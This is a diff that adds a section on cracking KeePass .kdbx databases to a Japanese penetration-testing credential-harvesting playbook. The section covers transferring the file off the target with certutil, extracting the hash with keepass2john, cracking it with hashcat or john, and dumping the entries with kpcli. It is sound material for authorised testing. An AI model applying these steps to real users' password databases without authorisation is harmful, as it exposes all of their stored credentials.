@@ -16,6 +16,7 @@
 | 6 | GPP cpassword（Group Policy Preferences） | SYSVOL に Groups.xml が存在し cpassword 属性がある |
 | 7 | Webアプリの .env ファイル | Webサーバーの公開ディレクトリにシェルでアクセスできた |
 | 8 | Bundler `.bundle/config` | Ruby アプリのプロセス（ruby / unicorn 等）としてシェルを取得済み |
+| 9 | KeePass データベース（.kdbx）のクラック | .kdbx ファイルを取得できた |
 
 ---
 
@@ -336,6 +337,117 @@ su [TARGET_USER]
 - ファイルの権限が `r-xr-xr-x`（グループ・ワールド読み取り可能）であっても内容は見えるため、ほかのユーザーのファイルも試す
 - RubyGems のパスワードと OS ユーザーのパスワードが一致しないこともある。その場合は他の認証情報探索を続ける
 - → 取得した認証情報の確認手順：このファイル末尾「認証情報を取得したら必ず試すこと」を参照
+
+---
+
+---
+
+## パターン9: KeePass データベース（.kdbx）のクラック
+
+### 着火条件
+
+ターゲットのファイルシステム上（デスクトップ・Documents・共有フォルダ等）に **`.kdbx` ファイル**（KeePass パスワードマネージャーのデータベース形式）が存在する場合。マスターパスワードをクラックできれば、データベース内に保存された全サービスの認証情報にアクセスできる。
+
+**攻撃者の思考トレース：** パスワードマネージャーは「認証情報の集約ポイント」。マスターパスワードが弱ければ、一度クラックするだけで多数のサービスへのアクセスを得られる。優先度の高い発見物。
+
+### 環境前提
+
+- 実行環境: テスター端末
+- 必要なツール:
+  - `keepass2john`（JohnTheRipper に同梱。ペネトレ用Linuxディストリ標準搭載）
+  - `john` / `hashcat`（ペネトレ用Linuxディストリ標準搭載）
+  - `kpcli` または `keepassxc`（データベースの内容確認用。オプション）
+- オフライン代替: hashcat は単体で動作。john は wordlist があればオフラインで動作
+
+### 観点・着眼点
+
+**先に確認すること：** `.kdbx` ファイルはターゲットから直接開けない場合が多い（マスターパスワード・キーファイルが必要）。まずファイルをテスター端末に転送してからクラックする。
+
+**KeePass 認証方式の種類と難易度：**
+
+| 認証方式 | 説明 | クラック可否 |
+|---------|------|------------|
+| マスターパスワードのみ | パスワード単体で保護 | クラック可能（keepass2john → hashcat）|
+| パスワード + キーファイル | キーファイルも必要 | キーファイルも入手できれば可能 |
+| Windows ユーザーアカウント認証 | Windows 資格情報が必要 | 難易度高（その Windows ユーザーとして実行が必要）|
+
+**何が出たら次に何をするか：**
+
+| 状況 | 次のアクション |
+|------|--------------|
+| マスターパスワードがクラックできた | データベース内の全エントリを確認 → SSH・Web・サービスの認証情報を取得 |
+| クラック時間が非現実的（数日以上） | 別の経路でマスターパスワードを探す（note.txt・設定ファイル・メール・メモリダンプ）|
+| `.kdbx` のバージョンが古い（KeePass 1.x → `.kdb`）| `keepass2john` は `.kdb` も対応 |
+
+### 手順
+
+**Step 1: ターゲットからファイルを転送する**
+
+```bash
+# [Target → Attacker] certutil でBase64エンコードしてから転送（Windows シェルの場合）
+certutil -encode C:\Users\[USER]\Desktop\credentials.kdbx C:\Temp\credentials.b64
+
+# [Attacker] テスター端末でデコード
+cat credentials.b64 | base64 -d > credentials.kdbx
+# または
+base64 -d < credentials.b64 > credentials.kdbx
+```
+
+**Step 2: keepass2john でハッシュを抽出する**
+
+```bash
+# [Attacker]
+keepass2john credentials.kdbx > keepass_hash.txt
+cat keepass_hash.txt
+# → credentials:$keepass$*2*[iterations]*[salt]*[hash]... の形式が出力される
+```
+
+**Step 3: hashcat / john でマスターパスワードをクラックする**
+
+```bash
+# [Attacker] hashcat（GPU使用、高速）
+# mode 13400 = KeePass
+hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt
+
+# [Attacker] john（CPU使用）
+john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
+john --show keepass_hash.txt   # クラック済みパスワードの確認
+```
+
+**Step 4: データベースの内容を確認する**
+
+```bash
+# [Attacker] kpcli（CLI ツール）でデータベースを開く
+# インストール: sudo apt install kpcli
+kpcli --kdb=credentials.kdbx
+# → マスターパスワードのプロンプトが出る → クラックしたパスワードを入力
+# データベース内コマンド:
+#   ls           - エントリ一覧
+#   cd [path]    - フォルダ移動
+#   show [entry] - エントリの詳細（パスワード含む）表示
+#   quit         - 終了
+
+# または KeePassXC（GUI）でも同様に開ける
+```
+
+**Step 5: 取得した認証情報を試す**
+
+データベース内の各エントリを確認し、ユーザー名・パスワード・URL を記録する。  
+→ このページ末尾「認証情報を取得したら必ず試すこと」に進む。
+
+### 刺さらなかったとき
+
+| 状況 | 対処 |
+|------|------|
+| wordlist でクラックできない | カスタム wordlist を試す（`hashcat -r rules/best64.rule`）または別経路でマスターパスワードを探す（ターゲットのホームディレクトリ・メール・note.txt 等）|
+| `keepass2john` がエラーになる | `.kdbx` が破損している可能性。別の `.kdbx` ファイルが存在しないか探す |
+| キーファイル `.key` が必要と表示される | `keepass2john` にキーファイルも渡す: `keepass2john -k [keyfile] credentials.kdbx` |
+
+### 注意点・落とし穴
+
+- クラックに失敗した場合でも、ターゲット内を探索して **マスターパスワードをメモした別ファイル（note.txt / readme.txt 等）** が存在する可能性がある。探索を先に行ってもよい
+- KeePass のマスターパスワードは長い・複雑なケースが多く、簡単な wordlist ではクラックできないことがある。時間の読みが重要
+- 取得した認証情報は必ず暗号化保管し、案件終了時に破棄する（商用案件）
 
 ---
 
